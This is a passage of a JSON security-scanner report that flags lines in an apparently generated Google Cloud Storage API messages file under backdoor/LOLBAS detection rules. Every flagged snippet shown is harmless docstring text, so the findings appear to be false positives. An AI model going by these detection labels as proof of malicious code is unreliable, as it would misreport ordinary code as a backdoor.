                    "text": "        - roles/storage.objectViewer - Read-Only access to Google Cloud\n        Storage objects.   - roles/storage.objectCreator - Access to create\n        objects in Google Cloud Storage.   - roles/storage.objectAdmin - Full\n        control of Google Cloud Storage objects.   The legacy IAM roles are:\n        - roles/storage.legacyObjectReader - Read-only access to objects\n        without listing. Equivalent to an ACL entry on an object with the\n        READER role.   - roles/storage.legacyObjectOwner - Read/write access\n",
                    "rendered": {
                      "text": "        - roles/storage.objectViewer - Read-Only access to Google Cloud\n        Storage objects.   - roles/storage.objectCreator - Access to create\n        objects in Google Cloud Storage.   - roles/storage.objectAdmin - Full\n        control of Google Cloud Storage objects.   The legacy IAM roles are:\n        - roles/storage.legacyObjectReader - Read-only access to objects\n        without listing. Equivalent to an ACL entry on an object with the\n        READER role.   - roles/storage.legacyObjectOwner - Read/write access\n",
                      "markdown": "`        - roles/storage.objectViewer - Read-Only access to Google Cloud\n        Storage objects.   - roles/storage.objectCreator - Access to create\n        objects in Google Cloud Storage.   - roles/storage.objectAdmin - Full\n        control of Google Cloud Storage objects.   The legacy IAM roles are:\n        - roles/storage.legacyObjectReader - Read-only access to objects\n        without listing. Equivalent to an ACL entry on an object with the\n        READER role.   - roles/storage.legacyObjectOwner - Read/write access\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 763,
                  "startColumn": 34,
                  "endLine": 763,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        directly to those provided by ACLs, and legacy IAM roles, which do map\n        directly to ACL permissions. All roles are of the format\n        roles/storage.specificRole. The new IAM roles are:   -\n        roles/storage.admin - Full control of Google Cloud Storage resources.\n        - roles/storage.objectViewer - Read-Only access to Google Cloud\n        Storage objects.   - roles/storage.objectCreator - Access to create\n        objects in Google Cloud Storage.   - roles/storage.objectAdmin - Full\n",
                    "rendered": {
                      "text": "        directly to those provided by ACLs, and legacy IAM roles, which do map\n        directly to ACL permissions. All roles are of the format\n        roles/storage.specificRole. The new IAM roles are:   -\n        roles/storage.admin - Full control of Google Cloud Storage resources.\n        - roles/storage.objectViewer - Read-Only access to Google Cloud\n        Storage objects.   - roles/storage.objectCreator - Access to create\n        objects in Google Cloud Storage.   - roles/storage.objectAdmin - Full\n",
                      "markdown": "`        directly to those provided by ACLs, and legacy IAM roles, which do map\n        directly to ACL permissions. All roles are of the format\n        roles/storage.specificRole. The new IAM roles are:   -\n        roles/storage.admin - Full control of Google Cloud Storage resources.\n        - roles/storage.objectViewer - Read-Only access to Google Cloud\n        Storage objects.   - roles/storage.objectCreator - Access to create\n        objects in Google Cloud Storage.   - roles/storage.objectAdmin - Full\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 687,
                  "startColumn": 62,
                  "endLine": 688,
                  "snippet": {
                    "text": "\n  Fields:\n    items: The list of items.\n    kind: The kind of item this is. For lists of object access control\n      entries, this is always storage#objectAccessControls.\n  \"\"\"\n\n  items = _messages.MessageField('extra_types.JsonValue', 1, repeated=True)\n",
                    "rendered": {
                      "text": "\n  Fields:\n    items: The list of items.\n    kind: The kind of item this is. For lists of object access control\n      entries, this is always storage#objectAccessControls.\n  \"\"\"\n\n  items = _messages.MessageField('extra_types.JsonValue', 1, repeated=True)\n",
                      "markdown": "`\n  Fields:\n    items: The list of items.\n    kind: The kind of item this is. For lists of object access control\n      entries, this is always storage#objectAccessControls.\n  \"\"\"\n\n  items = _messages.MessageField('extra_types.JsonValue', 1, repeated=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 648,
                  "startColumn": 53,
                  "endLine": 648,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    etag: HTTP 1.1 Entity tag for the access-control entry.\n    generation: The content generation of the object.\n    id: The ID of the access-control entry.\n    kind: The kind of item this is. For object access control entries, this is\n      always storage#objectAccessControl.\n    object: The name of the object.\n    projectTeam: The project team associated with the entity, if any.\n",
                    "rendered": {
                      "text": "    etag: HTTP 1.1 Entity tag for the access-control entry.\n    generation: The content generation of the object.\n    id: The ID of the access-control entry.\n    kind: The kind of item this is. For object access control entries, this is\n      always storage#objectAccessControl.\n    object: The name of the object.\n    projectTeam: The project team associated with the entity, if any.\n",
                      "markdown": "`    etag: HTTP 1.1 Entity tag for the access-control entry.\n    generation: The content generation of the object.\n    id: The ID of the access-control entry.\n    kind: The kind of item this is. For object access control entries, this is\n      always storage#objectAccessControl.\n    object: The name of the object.\n    projectTeam: The project team associated with the entity, if any.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 535,
                  "startColumn": 63,
                  "endLine": 535,
                  "endColumn": 67,
                  "snippet": {
                    "text": "      about using the MD5 hash, see Hashes and ETags: Best Practices.\n    mediaLink: Media download link.\n    metadata: User-provided metadata, in key/value pairs.\n    metageneration: The version of the metadata for this object at this\n      generation. Used for preconditions and for detecting changes in\n      metadata. A metageneration number is only meaningful in the context of a\n      particular generation of a particular object.\n",
                    "rendered": {
                      "text": "      about using the MD5 hash, see Hashes and ETags: Best Practices.\n    mediaLink: Media download link.\n    metadata: User-provided metadata, in key/value pairs.\n    metageneration: The version of the metadata for this object at this\n      generation. Used for preconditions and for detecting changes in\n      metadata. A metageneration number is only meaningful in the context of a\n      particular generation of a particular object.\n",
                      "markdown": "`      about using the MD5 hash, see Hashes and ETags: Best Practices.\n    mediaLink: Media download link.\n    metadata: User-provided metadata, in key/value pairs.\n    metageneration: The version of the metadata for this object at this\n      generation. Used for preconditions and for detecting changes in\n      metadata. A metageneration number is only meaningful in the context of a\n      particular generation of a particular object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 281,
                  "startColumn": 62,
                  "endLine": 282,
                  "snippet": {
                    "text": "\n  Fields:\n    items: The list of items.\n    kind: The kind of item this is. For lists of bucket access control\n      entries, this is always storage#bucketAccessControls.\n  \"\"\"\n\n  items = _messages.MessageField('BucketAccessControl', 1, repeated=True)\n",
                    "rendered": {
                      "text": "\n  Fields:\n    items: The list of items.\n    kind: The kind of item this is. For lists of bucket access control\n      entries, this is always storage#bucketAccessControls.\n  \"\"\"\n\n  items = _messages.MessageField('BucketAccessControl', 1, repeated=True)\n",
                      "markdown": "`\n  Fields:\n    items: The list of items.\n    kind: The kind of item this is. For lists of bucket access control\n      entries, this is always storage#bucketAccessControls.\n  \"\"\"\n\n  items = _messages.MessageField('BucketAccessControl', 1, repeated=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 244,
                  "startColumn": 53,
                  "endLine": 244,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    entityId: The ID for the entity, if any.\n    etag: HTTP 1.1 Entity tag for the access-control entry.\n    id: The ID of the access-control entry.\n    kind: The kind of item this is. For bucket access control entries, this is\n      always storage#bucketAccessControl.\n    projectTeam: The project team associated with the entity, if any.\n    role: The access permission for the entity. Can be READER, WRITER, or\n",
                    "rendered": {
                      "text": "    entityId: The ID for the entity, if any.\n    etag: HTTP 1.1 Entity tag for the access-control entry.\n    id: The ID of the access-control entry.\n    kind: The kind of item this is. For bucket access control entries, this is\n      always storage#bucketAccessControl.\n    projectTeam: The project team associated with the entity, if any.\n    role: The access permission for the entity. Can be READER, WRITER, or\n",
                      "markdown": "`    entityId: The ID for the entity, if any.\n    etag: HTTP 1.1 Entity tag for the access-control entry.\n    id: The ID of the access-control entry.\n    kind: The kind of item this is. For bucket access control entries, this is\n      always storage#bucketAccessControl.\n    projectTeam: The project team associated with the entity, if any.\n    role: The access permission for the entity. Can be READER, WRITER, or\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 60,
                  "endLine": 135,
                  "endColumn": 64,
                  "snippet": {
                    "text": "            this condition matches live objects; if the value is false, it\n            matches archived objects.\n          numNewerVersions: Relevant only for versioned objects. If the value\n            is N, this condition is satisfied when there are at least N\n            versions (including the live version) newer than this version of\n            the object.\n        \"\"\"\n",
                    "rendered": {
                      "text": "            this condition matches live objects; if the value is false, it\n            matches archived objects.\n          numNewerVersions: Relevant only for versioned objects. If the value\n            is N, this condition is satisfied when there are at least N\n            versions (including the live version) newer than this version of\n            the object.\n        \"\"\"\n",
                      "markdown": "`            this condition matches live objects; if the value is false, it\n            matches archived objects.\n          numNewerVersions: Relevant only for versioned objects. If the value\n            is N, this condition is satisfied when there are at least N\n            versions (including the live version) newer than this version of\n            the object.\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 1983,
                  "startColumn": 48,
                  "endLine": 1983,
                  "endColumn": 54,
                  "snippet": {
                    "text": "      'done' flag is true. Calls that provide a rewriteToken can omit all\n      other request fields, but if included those fields must match the values\n      provided in the first rewrite request.\n    sourceBucket: Name of the bucket in which to find the source object.\n    sourceGeneration: If present, selects a specific revision of the source\n      object (as opposed to the latest version, the default).\n    sourceObject: Name of the source object. For information about how to URL\n",
                    "rendered": {
                      "text": "      'done' flag is true. Calls that provide a rewriteToken can omit all\n      other request fields, but if included those fields must match the values\n      provided in the first rewrite request.\n    sourceBucket: Name of the bucket in which to find the source object.\n    sourceGeneration: If present, selects a specific revision of the source\n      object (as opposed to the latest version, the default).\n    sourceObject: Name of the source object. For information about how to URL\n",
                      "markdown": "`      'done' flag is true. Calls that provide a rewriteToken can omit all\n      other request fields, but if included those fields must match the values\n      provided in the first rewrite request.\n    sourceBucket: Name of the bucket in which to find the source object.\n    sourceGeneration: If present, selects a specific revision of the source\n      object (as opposed to the latest version, the default).\n    sourceObject: Name of the source object. For information about how to URL\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 1583,
                  "startColumn": 48,
                  "endLine": 1583,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    object: A Object resource to be passed as the request body.\n    projection: Set of properties to return. Defaults to noAcl, unless the\n      object resource specifies the acl property, when it defaults to full.\n    sourceBucket: Name of the bucket in which to find the source object.\n    sourceGeneration: If present, selects a specific revision of the source\n      object (as opposed to the latest version, the default).\n    sourceObject: Name of the source object. For information about how to URL\n",
                    "rendered": {
                      "text": "    object: A Object resource to be passed as the request body.\n    projection: Set of properties to return. Defaults to noAcl, unless the\n      object resource specifies the acl property, when it defaults to full.\n    sourceBucket: Name of the bucket in which to find the source object.\n    sourceGeneration: If present, selects a specific revision of the source\n      object (as opposed to the latest version, the default).\n    sourceObject: Name of the source object. For information about how to URL\n",
                      "markdown": "`    object: A Object resource to be passed as the request body.\n    projection: Set of properties to return. Defaults to noAcl, unless the\n      object resource specifies the acl property, when it defaults to full.\n    sourceBucket: Name of the bucket in which to find the source object.\n    sourceGeneration: If present, selects a specific revision of the source\n      object (as opposed to the latest version, the default).\n    sourceObject: Name of the source object. For information about how to URL\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 837,
                  "startColumn": 11,
                  "endLine": 837,
                  "endColumn": 15,
                  "snippet": {
                    "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n",
                      "markdown": "`      not exceed 40 characters. Overrides userIp if both are provided.\n    trace: A tracing token of the form \"token:<tokenid>\" to include in api\n      requests.\n    userIp: IP address of the site where the request originates. Use this if\n      you want to enforce per-user limits.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 747,
                  "startColumn": 25,
                  "endLine": 747,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        account or a service account.   - user:emailid - An email address that\n        represents a specific account. For example, user:alice@gmail.com or\n        user:joe@example.com.   - serviceAccount:emailid - An email address\n        that represents a service account. For example,  serviceAccount:my-\n        other-app@appspot.gserviceaccount.com .   - group:emailid - An email\n        address that represents a Google group. For example,\n        group:admins@example.com.   - domain:domain - A Google Apps domain\n",
                    "rendered": {
                      "text": "        account or a service account.   - user:emailid - An email address that\n        represents a specific account. For example, user:alice@gmail.com or\n        user:joe@example.com.   - serviceAccount:emailid - An email address\n        that represents a service account. For example,  serviceAccount:my-\n        other-app@appspot.gserviceaccount.com .   - group:emailid - An email\n        address that represents a Google group. For example,\n        group:admins@example.com.   - domain:domain - A Google Apps domain\n",
                      "markdown": "`        account or a service account.   - user:emailid - An email address that\n        represents a specific account. For example, user:alice@gmail.com or\n        user:joe@example.com.   - serviceAccount:emailid - An email address\n        that represents a service account. For example,  serviceAccount:my-\n        other-app@appspot.gserviceaccount.com .   - group:emailid - An email\n        address that represents a Google group. For example,\n        group:admins@example.com.   - domain:domain - A Google Apps domain\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 744,
                  "startColumn": 20,
                  "endLine": 744,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        special identifier that represents anyone on the internet; with or\n        without a Google account.   - allAuthenticatedUsers - A special\n        identifier that represents anyone who is authenticated with a Google\n        account or a service account.   - user:emailid - An email address that\n        represents a specific account. For example, user:alice@gmail.com or\n        user:joe@example.com.   - serviceAccount:emailid - An email address\n        that represents a service account. For example,  serviceAccount:my-\n",
                    "rendered": {
                      "text": "        special identifier that represents anyone on the internet; with or\n        without a Google account.   - allAuthenticatedUsers - A special\n        identifier that represents anyone who is authenticated with a Google\n        account or a service account.   - user:emailid - An email address that\n        represents a specific account. For example, user:alice@gmail.com or\n        user:joe@example.com.   - serviceAccount:emailid - An email address\n        that represents a service account. For example,  serviceAccount:my-\n",
                      "markdown": "`        special identifier that represents anyone on the internet; with or\n        without a Google account.   - allAuthenticatedUsers - A special\n        identifier that represents anyone who is authenticated with a Google\n        account or a service account.   - user:emailid - An email address that\n        represents a specific account. For example, user:alice@gmail.com or\n        user:joe@example.com.   - serviceAccount:emailid - An email address\n        that represents a service account. For example,  serviceAccount:my-\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 548,
                  "startColumn": 29,
                  "endLine": 548,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n  \"\"\"\n\n  class CustomerEncryptionValue(_messages.Message):\n",
                    "rendered": {
                      "text": "    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n  \"\"\"\n\n  class CustomerEncryptionValue(_messages.Message):\n",
                      "markdown": "`    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n  \"\"\"\n\n  class CustomerEncryptionValue(_messages.Message):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 546,
                  "startColumn": 29,
                  "endLine": 546,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    size: Content-Length of the data in bytes.\n    storageClass: Storage class of the object.\n    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    size: Content-Length of the data in bytes.\n    storageClass: Storage class of the object.\n    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n  \"\"\"\n",
                      "markdown": "`    size: Content-Length of the data in bytes.\n    storageClass: Storage class of the object.\n    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 545,
                  "startColumn": 29,
                  "endLine": 545,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    selfLink: The link to this object.\n    size: Content-Length of the data in bytes.\n    storageClass: Storage class of the object.\n    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n",
                    "rendered": {
                      "text": "    selfLink: The link to this object.\n    size: Content-Length of the data in bytes.\n    storageClass: Storage class of the object.\n    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n",
                      "markdown": "`    selfLink: The link to this object.\n    size: Content-Length of the data in bytes.\n    storageClass: Storage class of the object.\n    timeCreated: The creation time of the object in RFC 3339 format.\n    timeDeleted: The deletion time of the object in RFC 3339 format. Will be\n      returned if and only if this version of the object has been deleted.\n    updated: The modification time of the object metadata in RFC 3339 format.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 521,
                  "startColumn": 11,
                  "endLine": 521,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    contentType: Content-Type of the object data. If contentType is not\n      specified, object downloads will be served as application/octet-stream.\n    crc32c: CRC32c checksum, as described in RFC 4960, Appendix B; encoded\n      using base64 in big-endian byte order. For more information about using\n      the CRC32c checksum, see Hashes and ETags: Best Practices.\n    customerEncryption: Metadata of customer-supplied encryption key, if the\n      object is encrypted by such a key.\n",
                    "rendered": {
                      "text": "    contentType: Content-Type of the object data. If contentType is not\n      specified, object downloads will be served as application/octet-stream.\n    crc32c: CRC32c checksum, as described in RFC 4960, Appendix B; encoded\n      using base64 in big-endian byte order. For more information about using\n      the CRC32c checksum, see Hashes and ETags: Best Practices.\n    customerEncryption: Metadata of customer-supplied encryption key, if the\n      object is encrypted by such a key.\n",
                      "markdown": "`    contentType: Content-Type of the object data. If contentType is not\n      specified, object downloads will be served as application/octet-stream.\n    crc32c: CRC32c checksum, as described in RFC 4960, Appendix B; encoded\n      using base64 in big-endian byte order. For more information about using\n      the CRC32c checksum, see Hashes and ETags: Best Practices.\n    customerEncryption: Metadata of customer-supplied encryption key, if the\n      object is encrypted by such a key.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 318,
                  "startColumn": 59,
                  "endLine": 318,
                  "endColumn": 66,
                  "snippet": {
                    "text": "    expiration: Date and time of notification channel expiration, expressed as\n      a Unix timestamp, in milliseconds. Optional.\n    id: A UUID or similar unique string that identifies this channel.\n    kind: Identifies this as a notification channel used to watch for changes\n      to a resource. Value: the fixed string \"api#channel\".\n    params: Additional parameters controlling delivery channel behavior.\n      Optional.\n",
                    "rendered": {
                      "text": "    expiration: Date and time of notification channel expiration, expressed as\n      a Unix timestamp, in milliseconds. Optional.\n    id: A UUID or similar unique string that identifies this channel.\n    kind: Identifies this as a notification channel used to watch for changes\n      to a resource. Value: the fixed string \"api#channel\".\n    params: Additional parameters controlling delivery channel behavior.\n      Optional.\n",
                      "markdown": "`    expiration: Date and time of notification channel expiration, expressed as\n      a Unix timestamp, in milliseconds. Optional.\n    id: A UUID or similar unique string that identifies this channel.\n    kind: Identifies this as a notification channel used to watch for changes\n      to a resource. Value: the fixed string \"api#channel\".\n    params: Additional parameters controlling delivery channel behavior.\n      Optional.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 315,
                  "startColumn": 24,
                  "endLine": 315,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n  Fields:\n    address: The address where notifications are delivered for this channel.\n    expiration: Date and time of notification channel expiration, expressed as\n      a Unix timestamp, in milliseconds. Optional.\n    id: A UUID or similar unique string that identifies this channel.\n    kind: Identifies this as a notification channel used to watch for changes\n",
                    "rendered": {
                      "text": "\n  Fields:\n    address: The address where notifications are delivered for this channel.\n    expiration: Date and time of notification channel expiration, expressed as\n      a Unix timestamp, in milliseconds. Optional.\n    id: A UUID or similar unique string that identifies this channel.\n    kind: Identifies this as a notification channel used to watch for changes\n",
                      "markdown": "`\n  Fields:\n    address: The address where notifications are delivered for this channel.\n    expiration: Date and time of notification channel expiration, expressed as\n      a Unix timestamp, in milliseconds. Optional.\n    id: A UUID or similar unique string that identifies this channel.\n    kind: Identifies this as a notification channel used to watch for changes\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1/storage_v1_messages.py"
                },
                "region": {
                  "startLine": 307,
                  "startColumn": 37,
                  "endLine": 307,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n\nclass Channel(_messages.Message):\n  r\"\"\"An notification channel used to watch for resource changes.\n\n  Messages:\n    ParamsValue: Additional parameters controlling delivery channel behavior.\n",
                    "rendered": {
                      "text": "\n\nclass Channel(_messages.Message):\n  r\"\"\"An notification channel used to watch for resource changes.\n\n  Messages:\n    ParamsValue: Additional parameters controlling delivery channel behavior.\n",
